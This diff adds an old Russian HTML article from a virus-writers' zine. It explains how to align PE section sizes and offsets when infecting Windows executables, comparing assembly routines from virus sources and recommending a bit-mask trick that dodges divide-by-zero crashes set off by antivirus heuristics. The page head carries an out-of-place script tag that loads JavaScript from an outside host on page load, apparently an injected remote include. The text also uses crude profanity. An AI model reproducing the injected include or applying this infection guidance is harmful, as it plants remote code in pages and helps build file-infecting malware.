@@ -1,0 +1,115 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>О ВЫРАВНИВАНИИ СЕКЦИЙ</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
+</HEAD>
+<BODY bgcolor=#C0C0C0 text=#000000>
+<pre>
+
+                           О ВЫРАВНИВАНИИ СЕКЦИЙ
+                           ~~~~~~~~~~~~~~~~~~~~~
+
+   Для начала кусок доков по PE формату:
+
+PE Header:
+...
+38h DWORD ObjectAlign  Выравнивание программных секций, должен быть степенью
+                       2 между 512 и 256М включительно, связано с системой
+                       памяти. При использовании других значений программа
+                       не загрузится.
+
+3Ch DWORD FileAlign    Фактор используемый для выравнивания секций в файле.
+                       Указывает на границу на которую секции дополняются 0
+                       при размещении в файле. Должен быть степенью 2 в
+                       диапазоне от 512 до 64К включительно.
+                       Прочие значения вызовут ошибку загрузки файла.
+...
+
+ObjectEntry:
+...
+08h DWORD VirtSize     Виртуальный размер секции, именно столько памяти будет
+                       отведено под секцию. Если VirtSize превышает PhysSize,
+                       то разница заполняется нулями, так определяются секции
+                       неинициализированных данных (PhysSize=0)
+
+0Ch DWORD VirtRVA      Размещение секции в памяти, ее виртуальный адрес
+                       относительно ImageBase. Позиция каждой секции, обычно,
+                       выровнена на границу ObjectAlign.
+
+10h DWORD PhysSize     Размер секции (ее инициализированной части) в файле,
+                       кратно полю FileAlign.
+
+14h DWORD PhysOffs     Физическое смещение относительно начала EXE файла,
+                       выровнено на границу FileAlign. Смещение используется
+                       загрузчиком как seek значение.
+...
+
+   Теперь об выравнивании.
+
+   При заражении PE файлов иногда возникает необходимость выровнять
+   какие-нибудь из вышеприведенных элементов структуры ObjectEntry в
+   соответствии с полями PE Header'а FileAlign и/или ObjectAlign.
+
+   При рассмотрении хуевой кучи исходников, была найдена примерно такая вот
+   мысль, в виде куска кода распространяющаяся от сорца к сорцу,
+   причем быстрее самих вирусов:
+
+CORR_SIZE:      PUSH    EDX
+                XOR     EDX,EDX
+                DIV     [PEH_OBJALIGN.ESI]
+                AND     EDX,EDX
+                JE      NO_ALIGN
+                INC     EAX
+NO_ALIGN:       MUL     [PEH_OBJALIGN.ESI]
+                POP     EDX
+                MOV     [OT_VIRTSIZE.EDI],EAX
+                RETN
+
+AlignF proc
+       push ebp edx
+       mov ebp, [esi+60]
+  _align:
+       sub edx, edx
+       div ebp
+       test edx, edx
+       jz @@1
+       inc eax
+       sub edx, edx
+  @@1:
+       mul ebp
+       pop edx ebp
+       ret
+AlignF endp
+
+Calc1:          mov     eax, CodeSize
+Calc2:          xor     edx, edx
+                div     ecx
+                or      edx, edx
+                jz      $+3
+                inc     eax
+                mul     ecx
+                ret
+
+  и так далее... Ну, кто узнал свое? ;-)
+
+  Теперь рассмотрим ситуацию, когда в делитель пришел 0. Ответ ясен: ваш
+  вирус СГЛЮЧИТ, и маздай выдаст поинтер на с таким трудом написанный код.
+  А может быть, это антивирусная эвристика спецом подсунула такой хуевый
+  файл и только и ждет DIV 0, а?
+
+  ДА, можно вставить проверку на 0.
+  Но не красивее ли ВООБЩЕ не использовать DIV, прочитав наконец доку,
+  и поняв, что делитель, он же File/ObjectAlignment суть степень ДВОЙКИ ?
+
+        mov     eax, FileOrObjectAlign
+        dec     eax
+        add     SomethingToBeAligned, eax
+        not     eax
+        and     SomethingToBeAligned, eax
+
+  А DIVы, процедуры с PUSHем EDXа и условными JMPами пусть сосут.
+
+                                   * * *
+
+ 
